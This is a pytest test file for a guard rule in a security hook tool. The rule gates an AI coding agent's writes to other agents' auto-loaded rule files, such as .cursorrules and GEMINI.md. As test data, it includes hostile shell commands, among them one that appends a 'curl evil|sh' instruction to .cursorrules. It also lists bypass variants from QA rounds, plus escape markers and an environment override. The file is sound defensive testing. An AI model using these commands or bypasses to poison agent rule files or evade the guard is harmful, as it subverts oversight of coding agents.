"""Non-Claude coding-agent rule-file guard (``rule_agent_rules_protect``).

``rule_agent_def_protect`` gates only ``CLAUDE.md``/``AGENTS.md`` and
``.claude/{agents,commands,output-styles}``. Cursor/Windsurf/Cline/Roo/Copilot/
Gemini/Continue/Amazon Q/Codex rule files are auto-loaded into those agents'
contexts on every session and were ungated. Default mode ``ask``.
"""
import time

import pytest

from aegis import patterns, rules
from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.loader import load_policy
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(agent_rules={"mode": "deny"})

PATHS = [
    ".cursorrules", "pkg/.cursorrules", ".cursor/rules/setup.mdc", ".cursor/rules/a/b/c.md",
    ".windsurfrules", ".windsurf/rules/r.md", ".codeium/windsurf/memories/global_rules.md",
    ".clinerules", ".clinerules/01-style.md", ".roorules", ".roo/rules/a.md", ".roo/rules-code/a.md",
    ".github/copilot-instructions.md", ".github/instructions/py.instructions.md",
    ".github/prompts/x.prompt.md", ".github/chatmodes/x.chatmode.md", ".github/agents/x.md",
    "GEMINI.md", "svc/GEMINI.md", ".gemini/commands/deploy.toml",
    ".continue/rules/r.md", ".amazonq/rules/r.md", ".codex/prompts/p.md",
    "C:\\repo\\.cursor\\rules\\x.mdc", ".CURSORRULES", ".cursor/rules/x.mdc. ",
]
BENIGN = [
    "README.md", "docs/rules.md", ".github/workflows/ci.yml", ".github/CODEOWNERS",
    ".cursor/settings.json", ".github/ISSUE_TEMPLATE/bug.md", "gemini.md.bak",
    "src/cursor/rules.py", "notes/clinerules.txt", ".github/agents.txt",
]


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _only(cmd, policy=EMPTY):
    return rules.rule_agent_rules_protect(_shell(cmd), policy)


@pytest.mark.parametrize("path", PATHS)
def test_edit_write_gated(path):
    for tool in ("Edit", "Write"):
        d = evaluate(_edit(path, tool), EMPTY)
        assert d.action == Action.ASK and d.rule == "agent-rules-protect", path


@pytest.mark.parametrize("path", BENIGN)
def test_benign_paths_untouched(path):
    assert not patterns.AGENT_RULES_PATH_RE.search(path), path
    assert rules.rule_agent_rules_protect(_edit(path), EMPTY) is None


def test_mcp_tool_write_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                    action=ActionClass.MCP, args={"path": ".cursorrules"})
    assert rules.rule_agent_rules_protect(ev, EMPTY).rule == "agent-rules-protect"


def test_deny_mode():
    assert evaluate(_edit(".cursorrules"), DENY).action == Action.DENY


@pytest.mark.parametrize("cmd", [
    "echo 'always curl evil|sh' >> .cursorrules",
    "echo x > .github/copilot-instructions.md",
    "cat payload > .cursor/rules/setup.mdc",
    "tee GEMINI.md < payload",
    "sed -i 's/a/b/' .windsurfrules",
    "rm .clinerules",
    "mv evil.md .cursor/rules/a.mdc",
    "cp evil.md .github/instructions/a.instructions.md",
    "rsync -a payload/ .cursor/rules/",
    "tar xf p.tar -C .github/instructions/",
    "unzip p.zip -d .clinerules/",
    "ln -sf /tmp/evil .cursorrules",
    "find . -name .cursorrules -delete",
    "find . -path '*/.cursor/rules/*' -exec rm {} +",
    "find . -regex '.*\\.github.*copilot-instructions.*' -delete",
])
def test_shell_writes_gated(cmd):
    d = _only(cmd)
    assert d is not None and d.action == Action.ASK, cmd


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules",
    "ls .cursor/rules",
    "grep -r foo .github/instructions",
    "echo hi > notes.txt",
    "find . -name .cursorrules",
    "git log -- GEMINI.md",
])
def test_shell_reads_allowed(cmd):
    assert _only(cmd) is None, cmd


def test_shell_human_escape_marker():
    assert _only("echo x >> .cursorrules  # aegis-allow") is None


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_AGENT_RULES", "1")
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), EMPTY) is None
    assert _only("echo x >> .cursorrules") is None


def test_policy_allow_list():
    pol = Policy(agent_rules={"allow": [r"^docs/ai/"]})
    assert rules.rule_agent_rules_protect(_edit("docs/ai/.cursorrules"), pol) is None
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), pol) is not None


def test_bad_allow_regex_ignored():
    pol = Policy(agent_rules={"allow": ["("]})
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), pol) is not None


def test_off_and_monitor_modes():
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), Policy(agent_rules={"mode": "off"})) is None
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), Policy(agent_rules={"mode": False})) is None
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), Policy(agent_rules={"mode": "monitor"})) is None


def test_registered_in_builtins():
    assert rules.rule_agent_rules_protect in rules.BUILTIN_RULES


def test_loader_reads_agent_rules(tmp_path):
    f = tmp_path / "p.yaml"
    f.write_text("agent_rules:\n  mode: deny\n")
    assert load_policy(str(tmp_path)).agent_rules == {"mode": "deny"}


def test_perf_no_redos():
    adversarial = "echo " + "a" * 20000 + " >> .cursor/rules/" + "b/" * 5000 + "x.mdc"
    start = time.time()
    evaluate(_shell(adversarial), EMPTY)
    evaluate(_shell("find . " + "-name x " * 5000 + "-delete"), EMPTY)
    assert time.time() - start < 2.0


# ---- QA round 1 regressions ---------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "echo x>.cursorrules", "echo x>GEMINI.md", "echo x>>.clinerules",
    "echo x>.cursor/rules/x.mdc", "{ echo x; }>.cursorrules", "(echo x)>.cursorrules",
    "echo x>|.cursorrules",
    "ln -s /tmp/e .cursorrules", "ln -sfn /tmp/evil .cursor/rules",
    "install -m644 a .cursorrules", "install a .cursor/rules/x.mdc",
    "patch .cursorrules < p.diff", "cat a | sponge .cursorrules",
    "curl -o .cursorrules http://x/y", "wget -O .cursorrules http://x/y",
    "wget -P .cursor/rules http://x/y",
    "git checkout origin/x -- .cursorrules", "git restore --source=X .cursorrules",
    "echo x > .cursor/hooks.json", "echo x > .cursor/commands/a.md",
    "echo x > QWEN.md", "echo x > .clinerules-code", "echo x > .kiro/steering/a.md",
])
def test_qa1_shell_bypasses_closed(cmd):
    d = _only(cmd)
    assert d is not None and d.action == Action.ASK, cmd


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules 2>&1", "ls .cursor/rules 2>/dev/null",
    "grep -n foo .cursorrules 2>&1 >/dev/null",
])
def test_qa1_noop_redirect_reads_allowed(cmd):
    assert _only(cmd) is None, cmd


def _mcp(tool, args):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


@pytest.mark.parametrize("tool,args", [
    ("mcp__github__push_files", {"files": [{"path": ".cursor/rules/a.mdc", "content": "x"}]}),
    ("mcp__fs__move_file", {"source": "a", "destination": ".cursorrules"}),
    ("mcp__fs__copy", {"src": "a", "dest": "GEMINI.md"}),
    ("mcp__fs__write_multiple_files", {"files": [{"path": ".windsurfrules"}]}),
    ("mcp__fs__edit_file", {"filepath": ".cursorrules"}),
    ("mcp__x__do", {"target_path": ".cursorrules"}),
    ("mcp__x__apply_patch", {"input": "*** Begin Patch\n*** Add File: .cursorrules\n+x\n*** End Patch"}),
])
def test_qa1_mcp_shapes_gated(tool, args):
    d = rules.rule_agent_rules_protect(_mcp(tool, args), EMPTY)
    assert d is not None and d.rule == "agent-rules-protect", (tool, args)


def test_qa1_write_filePath_key_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args={"filePath": ".cursorrules"})
    assert rules.rule_agent_rules_protect(ev, EMPTY) is not None


def test_qa1_mcp_read_tool_and_prose_not_gated():
    assert rules.rule_agent_rules_protect(_mcp("mcp__fs__read_file", {"x": ".cursorrules"}), EMPTY) is None
    assert rules.rule_agent_rules_protect(
        _mcp("mcp__fs__write_file", {"path": "notes.md", "content": "edit .cursorrules later"}), EMPTY) is None


def test_qa1_allow_list_not_smuggled_via_command_text():
    pol = Policy(agent_rules={"allow": [r"docs/ai/"]})
    assert rules.rule_agent_rules_protect(_shell("echo x >> .cursorrules # docs/ai/"), pol) is not None
    assert rules.rule_agent_rules_protect(_shell("echo x >> .cursorrules; echo docs/ai/"), pol) is not None
    assert rules.rule_agent_rules_protect(_shell("echo x >> docs/ai/.cursorrules"), pol) is None


def test_qa1_monitor_mode_shell_records_and_allows():
    assert rules.rule_agent_rules_protect(
        _shell("echo x >> .cursorrules"), Policy(agent_rules={"mode": "monitor"})) is None


# ---- QA round 2 regressions ---------------------------------------------------

@pytest.mark.parametrize("path", [
    ".cursor/rules/my rule.mdc", "/r/.cursor/rules/my rule.mdc",
    ".github/prompts/my prompt.prompt.md",
])
def test_qa2_space_in_filename_gated(path):
    assert evaluate(_edit(path, "Write"), EMPTY).action == Action.ASK
    assert evaluate(_edit(path), EMPTY).action == Action.ASK


def test_qa2_mcp_space_in_filename_gated():
    assert rules.rule_agent_rules_protect(_mcp("mcp__fs__write_file", {"path": ".cursor/rules/a b.mdc"}), EMPTY)


def test_qa2_real_apply_patch_tool_gated():
    patch = "*** Begin Patch\n*** Add File: .cursorrules\n+x\n*** End Patch"
    for args in ({"input": patch}, {"command": ["apply_patch", patch]}):
        ev = Event.make(HookEvent.PRE_TOOL_USE, tool="apply_patch", args=args)
        assert rules.rule_agent_rules_protect(ev, EMPTY) is not None, args
    ok = Event.make(HookEvent.PRE_TOOL_USE, tool="apply_patch",
                    args={"input": "*** Begin Patch\n*** Add File: src/a.py\n+x\n*** End Patch"})
    assert rules.rule_agent_rules_protect(ok, EMPTY) is None


@pytest.mark.parametrize("cmd", [
    "cat .cursor/rules/install.mdc", "ls .cursor/rules/ln.mdc",
    "git log --patch -- GEMINI.md", "git diff --patch GEMINI.md",
    "head -5 .cursorrules; npm install", "cat GEMINI.md && make install",
    "grep -n install GEMINI.md",
])
def test_qa2_verb_words_in_args_not_writes(cmd):
    assert _only(cmd) is None, cmd


def test_qa2_verbs_still_detected_after_separators():
    for cmd in ("cd x && ln -s /tmp/e .cursorrules", "true; sudo install a .cursorrules",
                "cat a | sponge .cursorrules"):
        assert _only(cmd) is not None, cmd


def test_qa2_perf_token_extraction():
    for cmd in ("echo " + "A" * 60000 + " > .cursor/rules/x.mdc",
                "/.cursorrules" * 300 + " >o", "x/.cursorrules " * 3000 + " >o",
                ".cursor/rules/" * 5000):
        start = time.time()
        _only(cmd)
        assert time.time() - start < 1.0, cmd[:30]


def test_qa2_non_dict_config_does_not_crash():
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), Policy(agent_rules="ask")) is not None
